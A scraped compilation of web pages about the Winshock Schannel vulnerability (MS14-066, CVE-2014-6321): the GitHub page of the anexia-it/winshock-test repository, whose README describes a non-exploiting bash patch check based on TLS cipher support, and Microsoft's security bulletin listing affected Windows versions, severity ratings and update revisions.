  Take advantage of free Virtual Training Days, where participants of any skill level can build technical skills across a range of topics and technologies.
* [Microsoft Reactor](https://developer.microsoft.com/en-us/reactor/)

  Whether you're building your career or the next great idea, Microsoft Reactor connects you with the developers and startups that share your goals.

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from github.com_a75dfbe4_20250126_005637.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fanexia-it%2Fwinshock-test)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fanexia-it%2Fwinshock-test)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=anexia-it%2Fwinshock-test)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Jun 10, 2021. It is now read-only.

[anexia-it](/anexia-it)
/
**[winshock-test](/anexia-it/winshock-test)**
Public archive

* [Notifications](/login?return_to=%2Fanexia-it%2Fwinshock-test) You must be signed in to change notification settings
* [Fork
  54](/login?return_to=%2Fanexia-it%2Fwinshock-test)
* [Star
   100](/login?return_to=%2Fanexia-it%2Fwinshock-test)

Bash script that tests if a system is Winshock (MS14-066) vulnerable

### License

[MIT license](/anexia-it/winshock-test/blob/master/LICENSE)

[100
stars](/anexia-it/winshock-test/stargazers) [54
forks](/anexia-it/winshock-test/forks) [Branches](/anexia-it/winshock-test/branches) [Tags](/anexia-it/winshock-test/tags) [Activity](/anexia-it/winshock-test/activity)
 [Star](/login?return_to=%2Fanexia-it%2Fwinshock-test)

 [Notifications](/login?return_to=%2Fanexia-it%2Fwinshock-test) You must be signed in to change notification settings

* [Code](/anexia-it/winshock-test)
* [Issues
  5](/anexia-it/winshock-test/issues)
* [Pull requests
  0](/anexia-it/winshock-test/pulls)
* [Actions](/anexia-it/winshock-test/actions)
* [Projects
  0](/anexia-it/winshock-test/projects)
* [Wiki](/anexia-it/winshock-test/wiki)
* [Security](/anexia-it/winshock-test/security)
* [Insights](/anexia-it/winshock-test/pulse)

Additional navigation options

* [Code](/anexia-it/winshock-test)
* [Issues](/anexia-it/winshock-test/issues)
* [Pull requests](/anexia-it/winshock-test/pulls)
* [Actions](/anexia-it/winshock-test/actions)
* [Projects](/anexia-it/winshock-test/projects)
* [Wiki](/anexia-it/winshock-test/wiki)
* [Security](/anexia-it/winshock-test/security)
* [Insights](/anexia-it/winshock-test/pulse)

# anexia-it/winshock-test

    master[Branches](/anexia-it/winshock-test/branches)[Tags](/anexia-it/winshock-test/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[13 Commits](/anexia-it/winshock-test/commits/master/) | | |
| [.gitignore](/anexia-it/winshock-test/blob/master/.gitignore ".gitignore") | | [.gitignore](/anexia-it/winshock-test/blob/master/.gitignore ".gitignore") |  |  |
| [LICENSE](/anexia-it/winshock-test/blob/master/LICENSE "LICENSE") | | [LICENSE](/anexia-it/winshock-test/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/anexia-it/winshock-test/blob/master/README.md "README.md") | | [README.md](/anexia-it/winshock-test/blob/master/README.md "README.md") |  |  |
| [winshock\_test.sh](/anexia-it/winshock-test/blob/master/winshock_test.sh "winshock_test.sh") | | [winshock\_test.sh](/anexia-it/winshock-test/blob/master/winshock_test.sh "winshock_test.sh") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# winshock-test

Bash script that tests if a system is Winshock (MS14-066) vulnerable.

This script was developed by the emergency response team at [ANEXIA](http://www.anexia-wwc.com).

## Important

winshock\_test.sh does behavioural analysis based upon the available SSL ciphers.
If you either do not have direct access to the target system due to SSL-offloading in any form or manually modified the available SSL ciphers the script will
be giving **false positives**.

## Disclaimer

This script does in no way try to exploit the vulnerability described in MS14-066.
It merely checks for hints on whether the target system has been patched or not.
For details, have a look at the script itself or read the short 'How it works'
part of this document below.

## Usage

```
./winshock_test.sh 10.0.0.1 3389
./winshock_test.sh 10.0.0.2 443
```

Be sure to use a port on which a service is listening for SSL connections,
which you can actually connect to. If the script takes long to complete,
chances are good that either no service is listening on that port or
a firewall is blocking access to that port.

The examples above use the default RDP and HTTPS ports for those checks.

Also, please ensure you are connecting directly to the target system. A
load balancer or any other form of SSL-offloading may impact the results
and may generate false-positives or false-negatives.

## How it works

MS14-066 introduced four new SSL ciphers, so a check can be made if
the target system supports those previously unsupported ciphers.
winshock\_test.sh uses this fact by simply checking if those ciphers are
supported by the target system or not. If they are supported, the patches
have been applied.

## About

Bash script that tests if a system is Winshock (MS14-066) vulnerable

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/anexia-it/winshock-test/activity)
[Custom properties](/anexia-it/winshock-test/custom-properties)
### Stars

[**100**
stars](/anexia-it/winshock-test/stargazers)
### Watchers

[**6**
watching](/anexia-it/winshock-test/watchers)
### Forks

[**54**
forks](/anexia-it/winshock-test/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fanexia-it%2Fwinshock-test&report=anexia-it+%28user%29)

## [Releases](/anexia-it/winshock-test/releases)

[2
tags](/anexia-it/winshock-test/tags)

## [Packages 0](/orgs/anexia-it/packages?repo_name=winshock-test)

No packages published

## [Contributors 3](/anexia-it/winshock-test/graphs/contributors)

## Languages

* [Shell
  100.0%](/anexia-it/winshock-test/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from technet.microsoft.com_1f06a378_20250126_005637.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-066.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-066 - Critical

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in Schannel Could Allow Remote Code Execution (2992611)

Published: November 11, 2014 | Updated: December 9, 2014

**Version:** 3.0

## Executive Summary

This security update resolves a privately reported vulnerability in the [Microsoft Secure Channel (Schannel)](https://technet.microsoft.com/library/security/dn848375.aspx) security package in Windows. The vulnerability could allow remote code execution if an attacker sends specially crafted packets to a Windows server.

This security update is rated Critical for all supported releases of Microsoft Windows. For more information, see the **Affected Software** section.

The security update addresses the vulnerability by correcting how Schannel sanitizes specially crafted packets. For more information about the vulnerability, see the **Frequently Asked Questions (FAQ)** subsection for the specific vulnerability.

For more information about this update, see [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611).

## Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c8e2526e-bb30-4faf-a550-ad26fef05ccd) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=e1952d2f-df0c-40d0-ab55-28652933e993) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=ae98e940-dfde-407d-8e8f-b76a5f974219) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| **Windows Vista** |  |  |  |
| [Windows Vista Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=45413577-6bb8-4d14-b4e6-76ac56cdd8f4) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Vista x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=b949cc3e-ae99-4c8a-ac4d-4847cde7b12f) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| **Windows Server 2008** |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c05680a1-3bb2-43d3-b594-659563ac4d31) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=75f8eabe-d39a-41f0-9920-1394dda353e7) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for Itanium-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=220138ff-7217-400a-8b12-2e22f08e31ea) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| **Windows 7** |  |  |  |
| [Windows 7 for 32-bit Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=499f0744-5644-43b5-b80e-2b83e5a3b44d) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 7 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=77338ee3-95b3-4bab-bef9-7fb6c8d05f5e) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| **Windows Server 2008 R2** |  |  |  |
| [Windows Server 2008 R2 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=cc534b2e-e5f3-41d2-865b-c25cd3227f78) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2008 R2 for Itanium-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=790a26d0-33cc-48b3-9f00-996af83fbb7c) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| **Windows 8 and Windows 8.1** |  |  |  |
| [Windows 8 for 32-bit Systems](https://www.microsoft.com/download/details.aspx?familyid=418bd2ad-9ed8-47aa-ad87-d94550542072) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 8 for x64-based Systems](https://www.microsoft.com/download/details.aspx?familyid=712fe4ca-76a7-4bbd-8dd4-be4d30762548) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 8.1 for 32-bit Systems](https://www.microsoft.com/download/details.aspx?familyid=902d6e33-843a-42b5-a466-bcde3d29cb0c) (2992611) | Remote Code Execution | Critical | None |
| [Windows 8.1 for x64-based Systems](https://www.microsoft.com/download/details.aspx?familyid=dd430a3c-649d-4724-9b86-af8a5eba1925) (2992611) | Remote Code Execution | Critical | None |
| **Windows Server 2012 and Windows Server 2012 R2** |  |  |  |
| [Windows Server 2012](https://www.microsoft.com/download/details.aspx?familyid=aa355f7b-7316-415b-8fa9-b711c040594d) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012 R2](https://www.microsoft.com/download/details.aspx?familyid=bbaac95a-a997-41e1-b5ea-4687b48efe9c) (2992611) | Remote Code Execution | Critical | None |
| **Windows RT and Windows RT 8.1** |  |  |  |
| Windows RT[1](2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| Windows RT 8.1[1](2992611) | Remote Code Execution | Critical | None |
| **Server Core installation option** |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c05680a1-3bb2-43d3-b594-659563ac4d31) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=75f8eabe-d39a-41f0-9920-1394dda353e7) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 R2 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=cc534b2e-e5f3-41d2-865b-c25cd3227f78) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012](https://www.microsoft.com/download/details.aspx?familyid=aa355f7b-7316-415b-8fa9-b711c040594d) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012 R2](https://www.microsoft.com/download/details.aspx?familyid=bbaac95a-a997-41e1-b5ea-4687b48efe9c) (Server Core installation) (2992611) | Remote Code Execution | Critical | None |

[1]This update is available via [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130) only.

## Update FAQ

**Does this update contain any additional security-related changes to functionality?**

Yes. In addition to the changes that are listed in the Vulnerability Information section of this bulletin, this update includes changes to available TLS cipher suites for Windows 7, Windows Server 2008 R2, Windows 8, and Windows Server 2012 systems. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [November bulletin summary](https://technet.microsoft.com/library/security/ms14-nov).

| **Vulnerability Severity Rating and Maximum Security Impact by Affected Software** |  |  |
| --- | --- | --- |
| **Affected Software** | [**Microsoft Schannel Remote Code Execution Vulnerability - CVE-2014-6321**](https://www.cve.org/CVERecord?id=CVE-2014-6321) | **Aggregate Severity Rating** |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2003 x64 Edition Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2003 with SP2 for Itanium-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Vista** |  |  |
| Windows Vista Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Vista x64 Edition Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2008** |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows 7** |  |  |
| Windows 7 for 32-bit Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 7 for x64-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2008 R2** |  |  |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows 8 and Windows 8.1** |  |  |
| Windows 8 for 32-bit Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8 for x64-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8.1 for 32-bit Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8.1 for x64-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2012 and Windows Server 2012 R2** |  |  |
| Windows Server 2012 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 R2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows RT and Windows RT 8.1** |  |  |
| Windows RT (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows RT 8.1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Server Core installation option** |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 R2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |

## Microsoft Schannel Remote Code Execution Vulnerability - CVE-2014-6321

A remote code execution vulnerability exists in the [Secure Channel (Schannel)](https://technet.microsoft.com/library/security/dn848375.aspx) security package due to the improper processing of specially crafted packets. Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was issued, Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers. The update addresses the vulnerability by correcting how Schannel sanitizes specially crafted packets.

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### FAQ

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code on a target server.

**How could an attacker exploit the vulnerability?**

An attacker could attempt to exploit this vulnerability by sending specially crafted packets to a Windows server.

**What systems are primarily at risk from the vulnerability?**

Server and workstation systems that are running an affected version of Schannel are primarily at risk.

## Security Update Deployment

For Security Update Deployment information, see the Microsoft Knowledge Base article referenced in the Executive Summary.

## Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure. See [Acknowledgments](https://technet.microsoft.com/library/security/dn820091.aspx) for more information.

## Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

## Revisions

* V1.0 (November 11, 2014): Bulletin published.
* V2.0 (November 18, 2014): Bulletin revised to announce the reoffering of the 2992611 update to systems running Windows Server 2008 R2 and Windows Server 2012. The reoffering addresses known issues that a small number of customers experienced with the new TLS cipher suites that were included in the original release. Customers running Windows Server 2008 R2 or Windows Server 2012 who installed the 2992611 update prior to the November 18 reoffering should reapply the update. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.
* V3.0 (December 9, 2014): Bulletin revised to announce the reoffering of the 2992611 update to systems running Windows Vista and Windows Server 2008. The reoffering addresses an issue in the original release. Customers running Windows Vista or Windows Server 2008 who installed the 2992611 update prior to the December 9 reoffering should reapply the update. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.

*Page generated 2015-03-31 11:42Z-07:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025


